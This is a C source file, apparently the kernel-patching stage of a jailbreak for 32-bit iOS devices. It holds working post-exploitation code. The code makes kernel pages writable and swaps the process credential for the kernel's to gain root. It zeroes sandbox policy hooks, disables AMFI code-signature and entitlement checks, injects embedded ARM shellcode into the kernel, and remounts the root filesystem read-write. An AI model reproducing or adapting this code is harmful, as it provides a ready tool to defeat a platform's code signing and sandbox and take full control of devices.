//
//  unjail.c
//
//  Created by sakuRdev on 2021/11/18.
//  Copyright (c) 2021 sakuRdev. All rights reserved.
//

#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>

#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <spawn.h>
#include <fcntl.h>
#include <pthread.h>

#include "unjail.h"
#include "kernel_memory.h"
#include "patchfinder.h"

#include "mac.h"

void loader(void);

static mach_port_t pt;

static uint32_t kernel_base;
static uint32_t kernel_slide;

static uint32_t tte_virt;
static uint32_t tte_phys;

static kdata_t kernel_data;

static pid_t uid;
static uint32_t myproc=0;
static uint32_t mycred=0;

static uint32_t shc_base;
static uint32_t shc;

static unsigned char shc_bin[] = {
    0x00, 0xf0, 0x02, 0xb8, 0x00, 0xf0, 0x0f, 0xb8, 0xda, 0xf8, 0x00, 0x00,
    0x40, 0xf0, 0x80, 0x60, 0x40, 0xf0, 0x0f, 0x00, 0x20, 0xf4, 0x7c, 0x50,
    0xca, 0xf8, 0x00, 0x00, 0x00, 0x20, 0x06, 0xb0, 0xbd, 0xe8, 0x00, 0x0d,
    0xf0, 0xbd, 0x03, 0xb1, 0x00, 0xe0, 0xaf, 0xe0, 0xf0, 0xb5, 0x03, 0xaf,
    0x2d, 0xe9, 0x00, 0x0d, 0xf6, 0xb0, 0x6c, 0x46, 0x6f, 0xf3, 0x02, 0x04,
    0xa5, 0x46, 0xd7, 0xf8, 0x0c, 0x90, 0xd7, 0xf8, 0x08, 0xc0, 0xd7, 0xf8,
    0x2c, 0xe0, 0xbc, 0x6a, 0x7d, 0x6a, 0x3e, 0x6a, 0xd7, 0xf8, 0x1c, 0x80,
    0xd7, 0xf8, 0x18, 0xa0, 0xd7, 0xf8, 0x14, 0xb0, 0x1a, 0x90, 0x38, 0x69,
    0x19, 0x90, 0x1a, 0x98, 0x18, 0x90, 0x1d, 0xa8, 0x17, 0x90, 0x00, 0x20,
    0x16, 0x90, 0x18, 0x98, 0x75, 0x90, 0x74, 0x91, 0x73, 0x92, 0x72, 0x93,
    0xcd, 0xf8, 0xc4, 0x91, 0xcd, 0xf8, 0xc0, 0xc1, 0xcd, 0xf8, 0x54, 0xb0,
    0xcd, 0xf8, 0x50, 0x80, 0xcd, 0xf8, 0x4c, 0xa0, 0x12, 0x96, 0x11, 0x95,
    0xcd, 0xf8, 0x40, 0xe0, 0x0f, 0x94, 0x00, 0xf0, 0x6b, 0xf8, 0x1c, 0x90,
    0x00, 0x20, 0x1e, 0x90, 0x1d, 0x90, 0x20, 0x90, 0x4f, 0xf4, 0x60, 0x70,
    0x1f, 0x90, 0x16, 0x98, 0x21, 0x90, 0x72, 0x98, 0x1c, 0x9a, 0x17, 0x99,
    0x00, 0xf0, 0x63, 0xf8, 0x6f, 0x90, 0x6f, 0x98, 0x00, 0x28, 0x22, 0xd1,
    0x00, 0x20, 0x1b, 0x90, 0xbd, 0xf8, 0xc0, 0x00, 0x00, 0xf4, 0x00, 0x60,
    0x00, 0x28, 0x04, 0xd0, 0x01, 0x20, 0x2e, 0x99, 0x74, 0x9a, 0xd1, 0x60,
    0x1b, 0x90, 0xbd, 0xf8, 0xc0, 0x00, 0x00, 0xf4, 0x80, 0x60, 0x00, 0x28,
    0x04, 0xd0, 0x01, 0x20, 0x2f, 0x99, 0x74, 0x9a, 0xd1, 0x61, 0x1b, 0x90,
    0x1b, 0x98, 0x00, 0x28, 0x07, 0xd0, 0x73, 0x98, 0xd0, 0xf8, 0xbc, 0x00,
    0x40, 0xf4, 0x80, 0x70, 0x73, 0x99, 0xc1, 0xf8, 0xbc, 0x00, 0x75, 0x98,
    0x74, 0x99, 0x73, 0x9a, 0x72, 0x9b, 0xdd, 0xf8, 0xc0, 0x91, 0xdd, 0xf8,
    0xc4, 0xc1, 0xd7, 0xf8, 0x10, 0xe0, 0x7c, 0x69, 0xbd, 0x69, 0xfe, 0x69,
    0xd7, 0xf8, 0x20, 0x80, 0xd7, 0xf8, 0x24, 0xa0, 0xd7, 0xf8, 0x28, 0xb0,
    0x0e, 0x90, 0xf8, 0x6a, 0x0d, 0x90, 0x68, 0x46, 0x0c, 0x90, 0x0d, 0x98,
    0x0b, 0x91, 0x0c, 0x99, 0x48, 0x62, 0xc1, 0xf8, 0x20, 0xb0, 0xc1, 0xf8,
    0x1c, 0xa0, 0xc1, 0xf8, 0x18, 0x80, 0x4e, 0x61, 0x0d, 0x61, 0xcc, 0x60,
    0xc1, 0xf8, 0x08, 0xe0, 0xc1, 0xf8, 0x04, 0xc0, 0xc1, 0xf8, 0x00, 0x90,
    0x0e, 0x98, 0x0b, 0x99, 0x00, 0xf0, 0x14, 0xf8, 0xa7, 0xf1, 0x18, 0x04,
    0xa5, 0x46, 0xbd, 0xe8, 0x00, 0x0d, 0xf0, 0xbd, 0x40, 0xf2, 0x20, 0x00,
    0xc0, 0xf2, 0x00, 0x00, 0x78, 0x44, 0x00, 0x68, 0x00, 0x47, 0x40, 0xf2,
    0x16, 0x03, 0xc0, 0xf2, 0x00, 0x03, 0x7b, 0x44, 0x1b, 0x68, 0x18, 0x47,
    0x40, 0xf2, 0x0c, 0x09, 0xc0, 0xf2, 0x00, 0x09, 0xf9, 0x44, 0xd9, 0xf8,
    0x00, 0xc0, 0x60, 0x47, 0x41, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42,
    0x43, 0x43, 0x43, 0x43, 0x00, 0x20, 0x70, 0x47, 0x01, 0x20, 0x70, 0x47
};

static unsigned int shc_len = 432;

static unsigned int
make_b_w(int pos, int tgt)
{
    int delta;
    unsigned int i;
    unsigned short pfx;
    unsigned short sfx;
    
    unsigned int omask_1k = 0xB800;
    unsigned int omask_2k = 0xB000;
    unsigned int omask_3k = 0x9800;
    unsigned int omask_4k = 0x9000;
    
    unsigned int amask = 0x7FF;
    int range;
    
    range = 0x400000;
    
    delta = tgt - pos - 4; /* range: 0x400000 */
    i = 0;
    if(tgt > pos) i = tgt - pos - 4;
    if(tgt < pos) i = pos - tgt - 4;
    
    if (i < range){
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_1k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range < i && i < range*2){
        delta -= range;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_2k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*2 < i && i < range*3){
        delta -= range*2;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_3k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*3 < i && i < range*4){
        delta -= range*3;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_4k | ((delta >>  1) & amask);
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    return -1;
}

static void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
    uint32_t i = page >> 20;
    uint32_t j = (page >> 12) & 0xFF;
    uint32_t addr = tte_virt+(i<<2);
    uint32_t entry = rk32(addr);
    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
        uint32_t addr2 = page_entry+(j<<2);
        uint32_t entry2 = rk32(addr2);
        if (entry2) {
            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
            wk32(addr2, new_entry2);
        }
    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
        uint32_t new_entry = L1_PROTO_TTE(entry);
        new_entry &= ~L1_SECT_APX;
        wk32(addr, new_entry);
    }
    usleep(100000);
}

static void patch_tfp0(uint32_t p, uint32_t c){
    patch_page_table(tte_virt, tte_phys, (p & ~0xFFF));
    wk16(p, 0xbf00);

    patch_page_table(tte_virt, tte_phys, ((c+1) & ~0xFFF));
    wk8(c+1, 0xe0);
}

static void patch_i_can_has_debugger(uint32_t p1, uint32_t p2){
    patch_page_table(tte_virt, tte_phys, (p1 & ~0xFFF));
    patch_page_table(tte_virt, tte_phys, (p2 & ~0xFFF));
    wk32(p1, 1);
    wk32(p2, 1);
}

static void patch_vm_fault_enter(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    wk32(addr, 0x0b01f04f);
}

static void patch_vm_map_enter(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    wk32(addr, 0xbf00bf00);
}

static void patch_vm_map_protect(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    wk32(addr, 0xbf00bf00);
}

static void patch_csops(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if((addr & ~0xFFF) != ((addr+4) & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4) & ~0xFFF));
    wk32(addr, 0xbf00bf00);
    wk16(addr+4, 0xbf00);
}

static void patch_mount(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, ((addr+1) & ~0xFFF));
    wk8((addr+1), 0xe0);
}

static void patch_mapForIO(uint32_t addr, uint32_t ptr, uint32_t ret1){
    patch_page_table(tte_virt, tte_phys, (ptr & ~0xFFF));
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if((addr & ~0xFFF) != ((addr+4) & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4) & ~0xFFF));
    wk32(addr, 0xbf002000);
    wk32(addr+4, 0xbf00bf00);
    
    wk32(ptr, ret1);
}

static void patch_sbcall_debugger(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    wk32(addr, 0xbf00bf00);
}


static void patch_amfi_ret(uint32_t addr, uint32_t s){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    uint32_t unbase_addr = addr - kernel_base;
    uint32_t unbase_shc = s - kernel_base;
    uint32_t val = make_b_w(unbase_addr, unbase_shc);
    wk32(addr, val);
}

static void patch_amfi_cred_label_update_execve(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if(((addr+4+1) & ~0xFFF) != (addr & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4+1) & ~0xFFF));
    wk32(addr, 0xbf00bf00);
    wk32((addr+4+1), 0xe0);
    
}

static void patch_amfi_vnode_check_signature(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if(((addr+0x10) & ~0xFFF) != (addr & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+0x10) & ~0xFFF));
    wk32(addr, 0xbf00bf00);
    wk32(addr+4, 0xbf00bf00);
    wk32(addr+8, 0xbf00bf00);
    wk32(addr+12, 0xbf00bf00);
    wk32(addr+16, 0xbf00bf00);
}

static void patch_amfi_loadEntitlementsFromVnode(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if(((addr+4) & ~0xFFF) != (addr & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+4) & ~0xFFF));
    wk32(addr, 0xbf00bf00);
    wk16(addr+4, 0xbf00);
    wk16(addr+6, 0x2001);
}

static void patch_amfi_vnode_check_exec(uint32_t addr){
    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
    if(((addr+8) & ~0xFFF) != (addr & ~0xFFF)) patch_page_table(tte_virt, tte_phys, ((addr+8) & ~0xFFF));
    wk32(addr, 0xbf00bf00);
    wk32(addr+4, 0xbf00bf00);
    wk32(addr+8, 0xbf00bf00);
}

static void kdumper(uint32_t region, uint8_t *kdata, size_t ksize) {
    for (vm_address_t addr = region, e = 0; addr < region + ksize; addr += 2048, e += 2048) {
        pointer_t buf = 0;
        mach_msg_type_number_t sz = 0;
        vm_read(pt, addr, 2048, &buf, &sz);
        if (buf == 0 || sz == 0)
            continue;
        bcopy((uint8_t *)buf, kdata + e, 2048);
    }
}

static int kernel_init(uint8_t *buf){
    uint32_t min = -1;
    uint32_t max = 0;
    
    memset(&kernel_data, '\0', sizeof(kdata_t));
    
    if (*(uint32_t*)buf == MH_MAGIC) {
        const struct mach_header *hdr = (struct mach_header *)buf;
        const uint8_t *q = (uint8_t*)buf + sizeof(struct mach_header);
        
        for (uint32_t i = 0; i < hdr->ncmds; i++) {
            const struct load_command *cmd = (struct load_command *)q;
            if (cmd->cmd == LC_SEGMENT && ((struct segment_command *)q)->vmsize) {
                const struct segment_command *seg = (struct segment_command *)q;
                if (min > seg->vmaddr) {
                    min = seg->vmaddr;
                }
                if (max < seg->vmaddr + seg->vmsize) {
                    max = seg->vmaddr + seg->vmsize;
                }
                
                if (!strcmp(seg->segname, "__TEXT")) {
                    kernel_data.text.base.addr = seg->vmaddr;
                    kernel_data.text.base.size = seg->vmsize;
                    
                    const struct section *sec = (struct section *)(seg + 1);
                    for (uint32_t j = 0; j < seg->nsects; j++) {
                        if (!strcmp(sec[j].sectname, "__text")) {
                            kernel_data.text._text.addr = sec[j].addr;
                            kernel_data.text._text.size = sec[j].size;
                        } else if (!strcmp(sec[j].sectname, "__const")) {
                            kernel_data.text._const.addr = sec[j].addr;
                            kernel_data.text._const.size = sec[j].size;
                        } else if (!strcmp(sec[j].sectname, "__cstring")) {
                            kernel_data.text._cstring.addr = sec[j].addr;
                            kernel_data.text._cstring.size = sec[j].size;
                        } else if (!strcmp(sec[j].sectname, "__os_log")) {
                            kernel_data.text._os_log.addr = sec[j].addr;
                            kernel_data.text._os_log.size = sec[j].size;
                        }
                    }
                } else if (!strcmp(seg->segname, "__DATA")) {
                    kernel_data.data.base.addr = seg->vmaddr;
                    kernel_data.data.base.size = seg->vmsize;
                }
            }
            if (cmd->cmd == LC_UNIXTHREAD) {
                uint32_t *ptr = (uint32_t *)(cmd + 1);
                uint32_t flavor = ptr[0];
                struct {
                    uint32_t    r[13];  /* General purpose register r0-r12 */
                    uint32_t    sp;     /* Stack pointer r13 */
                    uint32_t    lr;     /* Link register r14 */
                    uint32_t    pc;     /* Program counter r15 */
                    uint32_t    cpsr;   /* Current program status register */
                } *thread = (typeof(thread))(ptr + 2);
                
                if (flavor == 6) {
                    kernel_data.kernel_entry = thread->pc;
                }
            }
            q = q + cmd->cmdsize;
        }
        
        kernel_data.kdumpbase = min;
        kernel_data.base.size = max - min;

        return 0;
    } else {
        return -1;
    }
    return -1;
}


void unjail(mach_port_t tfp0){
    pt = tfp0;
    kernel_base = (uint32_t)get_kernel_base(pt);
    kernel_slide = kernel_base - KERNEL_TEXT_BASEADDR;
    
    uint32_t region = kernel_base;
    size_t ksize = 0x1800000;
    
    unsigned char *kdata = (unsigned char *)malloc(ksize);
    kdumper(region, kdata, ksize);
    
    uint32_t last_section = 0;
    if (kernel_init(kdata) == 0){
        ksize = kernel_data.base.size;
        // search __TEXT free area
        uint32_t text_last = kernel_data.text.base.addr + (uint32_t)kernel_data.text.base.size;
        if(kernel_data.data.base.addr == text_last) {
            for (unsigned int i = 0; i < 4; i++) {
                uint32_t j=0;
                if(i==0) {
                    j = kernel_data.text._text.addr + (uint32_t)kernel_data.text._text.size;
                }
                if(i==1) {
                    j = kernel_data.text._const.addr + (uint32_t)kernel_data.text._const.size;
                }
                if(i==2) {
                    j = kernel_data.text._cstring.addr + (uint32_t)kernel_data.text._cstring.size;
                }
                if(i==3) {
                    j = kernel_data.text._os_log.addr + (uint32_t)kernel_data.text._os_log.size;
                }
                if(j > last_section) last_section = j;
            }
            
            printf("__TEXT last: 0x%08x\n", last_section);
            if(text_last <= (last_section+0x100+shc_len)) {
                printf("wtf?!\n");
                last_section = 0;
            } else {
                last_section += 0x100;
                last_section = (last_section & ~0xFF);
            }
        } else {
            printf("wtf!?\n");
            last_section = 0;
        }
    }
    
    if(last_section != 0) {
        shc_base = last_section - region;
    } else {
        shc_base = 0xd00;
    }
    printf("shellcode base: 0x%08x\n", shc_base);
    
    // patchfinder
    uint32_t proc_enforce = find_proc_enforce(region, kdata, ksize);
    uint32_t ret1_gadget = find_mov_r0_1_bx_lr(region, kdata, ksize);
    uint32_t pid_check = find_pid_check(region, kdata, ksize);
    uint32_t locked_task = find_convert_port_to_locked_task(region, kdata, ksize);
    uint32_t i_can_has_debugger_1 = find_i_can_has_debugger_1_103(region, kdata, ksize);
    uint32_t i_can_has_debugger_2 = find_i_can_has_debugger_2_103(region, kdata, ksize);
    uint32_t mount_patch = find_mount_103(region, kdata, ksize);
    uint32_t vm_map_enter = find_vm_map_enter_103(region, kdata, ksize);
    uint32_t vm_map_protect = find_vm_map_protect_103(region, kdata, ksize);
    uint32_t vm_fault_enter = find_vm_fault_enter_103(region, kdata, ksize);
    uint32_t csops_patch = find_csops_103(region, kdata, ksize);
    uint32_t amfi_ret = find_amfi_execve_ret(region, kdata, ksize);
    uint32_t amfi_cred_label_update_execve = find_amfi_cred_label_update_execve(region, kdata, ksize);
    uint32_t amfi_vnode_check_signature = find_amfi_vnode_check_signature(region, kdata, ksize);
    uint32_t amfi_loadEntitlementsFromVnode = find_amfi_loadEntitlementsFromVnode(region, kdata, ksize);
    uint32_t amfi_vnode_check_exec = find_amfi_vnode_check_exec(region, kdata, ksize);
    uint32_t mapForIO = find_mapForIO_103(region, kdata, ksize);
    uint32_t sbcall_debugger = find_sandbox_call_i_can_has_debugger_103(region, kdata, ksize);
    uint32_t vfsContextCurrent = find_vfs_context_current(region, kdata, ksize);
    uint32_t vnodeGetattr = find_vnode_getattr(region, kdata, ksize);
    uint32_t _allproc = find_allproc(region, kdata, ksize);
    uint32_t kernel_pmap = find_kernel_pmap(region, kdata, ksize);
    uint32_t kernelConfig_stub = find_lwvm_i_can_has_krnl_conf_stub(region, kdata, ksize);
    uint32_t sb_ops = find_sbops(region, kdata, ksize);
    
    /*
    printf("proc_enforce: 0x%08x\n", proc_enforce);
    printf("ret1_gadget: 0x%08x\n", ret1_gadget);
    printf("task_for_pid: 0x%08x\n", pid_check);
    printf("locked_task: 0x%08x\n", locked_task);
    printf("i_can_has_debugger_1: 0x%08x\n", i_can_has_debugger_1);
    printf("i_can_has_debugger_2: 0x%08x\n", i_can_has_debugger_2);
    printf("mount_patch: 0x%08x\n", mount_patch);
    printf("vm_map_enter: 0x%08x\n", vm_map_enter);
    printf("vm_map_protect: 0x%08x\n", vm_map_protect);
    printf("vm_fault_enter: 0x%08x\n", vm_fault_enter);
    printf("csops_patch: 0x%08x\n", csops_patch);
    printf("amfi_ret: 0x%08x\n", amfi_ret);
    printf("amfi_cred_label_update_execve: 0x%08x\n", amfi_cred_label_update_execve);
    printf("amfi_vnode_check_signature: 0x%08x\n", amfi_vnode_check_signature);
    printf("amfi_loadEntitlementsFromVnode: 0x%08x\n", amfi_loadEntitlementsFromVnode);
    printf("amfi_vnode_check_exec: 0x%08x\n", amfi_vnode_check_exec);
    printf("mapForIO: 0x%08x\n", mapForIO);
    printf("sbcall_debugger: 0x%08x\n", sbcall_debugger);
    printf("_vfs_context_current: 0x%08x\n", vfsContextCurrent);
    printf("_vnode_getattr: 0x%08x\n", vnodeGetattr);
    printf("_allproc: 0x%08x\n", _allproc);
    printf("_kernel_pmap: 0x%08x\n", kernel_pmap);
    printf("LwVM::_PE_i_can_has_kernel_configuration.stub: 0x%08x\n", kernelConfig_stub);
    printf("sbops: 0x%08x\n", sb_ops);
    */
    
    uid = getuid();
    if(uid != 0){
        uint32_t kproc = 0;
        myproc = 0;
        mycred = 0;
        pid_t mypid = getpid();
        uint32_t proc = rk32(kernel_base + _allproc);
        while (proc) {
            uint32_t pid = rk32(proc + 8); // p_pid
            if (pid == mypid) {
                myproc = proc;
            } else if (pid == 0) {
                kproc = proc;
            }
            proc = rk32(proc);
        }
        mycred = rk32(myproc + 0x98); // p_ucred
        uint32_t kcred = rk32(kproc + 0x98);
        wk32(myproc + 0x98, kcred);
        setuid(0);
        printf("[*] I am root?: %x\n", getuid());
    }
    
    
    uint32_t pmap = kernel_pmap + kernel_base;
    uint32_t pmap_store = rk32(pmap);
    tte_virt = rk32(pmap_store);
    tte_phys = rk32(pmap_store+4);
    
    printf("[*] pmap: %08x\n", pmap);
    printf("[*] pmap store: %08x\n", pmap_store);
    printf("[*] tte_virt: %08x\n", tte_virt);
    printf("[*] tte_phys: %08x\n", tte_phys);
    
    
    // patching kernel
    
    {
        // proc_enforce
        wk32(proc_enforce + kernel_base, 0);
        
        patch_i_can_has_debugger(i_can_has_debugger_1 + kernel_base,
                                 i_can_has_debugger_2 + kernel_base);
        
        patch_vm_fault_enter(vm_fault_enter + kernel_base);
        
        patch_vm_map_enter(vm_map_enter + kernel_base);
        
        patch_vm_map_protect(vm_map_protect + kernel_base);
        
        patch_csops(csops_patch + kernel_base);
        
        patch_mount(mount_patch + kernel_base);
        
        patch_mapForIO(mapForIO + kernel_base, kernelConfig_stub + kernel_base, ret1_gadget + kernel_base);
        
        patch_sbcall_debugger(sbcall_debugger + kernel_base);
    }
    
    {
        // task_for_pid 0
        patch_tfp0(pid_check + kernel_base, locked_task + kernel_base);
        
    }
    
    {
        // sb policies
        uint32_t sbops = kernel_base + sb_ops;
        
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_mount), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_umount), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_write), 0);
        
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_setauid), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_getauid), 0);

        wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
        
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_get_cs_info), 0);
        wk32(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_set_cs_info), 0);
        
        uint32_t execve = sbops+offsetof(struct mac_policy_ops, mpo_cred_label_update_execve);
        uint32_t execve_ptr = rk32(execve);
        
        {
            shc = kernel_base + shc_base;
            
            unsigned char buf[shc_len];
            memcpy(buf, shc_bin, shc_len);
            
            *(uint32_t*)(buf+0x019c) = kernel_base + vfsContextCurrent + 1;
            *(uint32_t*)(buf+0x01a0) = kernel_base + vnodeGetattr + 1;
            *(uint32_t*)(buf+0x01a4) = execve_ptr; // orig
            
            patch_page_table(tte_virt, tte_phys, (shc & ~0xFFF));
            kwrite(shc, buf, shc_len);
            sleep(1);
            
            printf("0x%08x -> 0x%08x\n", execve, (shc+4)+1);
            wk32(execve, (shc+4)+1);
        }
    }
    
    {
        // amfi_ret
        patch_amfi_ret(amfi_ret + kernel_base, shc);
        patch_amfi_cred_label_update_execve(amfi_cred_label_update_execve + kernel_base);
        patch_amfi_vnode_check_signature(amfi_vnode_check_signature + kernel_base);
        patch_amfi_loadEntitlementsFromVnode(amfi_loadEntitlementsFromVnode + kernel_base);
        patch_amfi_vnode_check_exec(amfi_vnode_check_exec + kernel_base);
    }
    
    printf("patched\n");
    sleep(1);
    
    {
        char* nmr = strdup("/dev/disk0s1s1");
        int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
        printf("remount = %d\n",mntr);
    }
    
    open("/tmp/.jbd",O_RDWR|O_CREAT);
    
}

void restart(void)
{
    loader();
    
    if(uid != 0){
        wk32(myproc + 0x98, mycred);
        setuid(uid);
    }
}
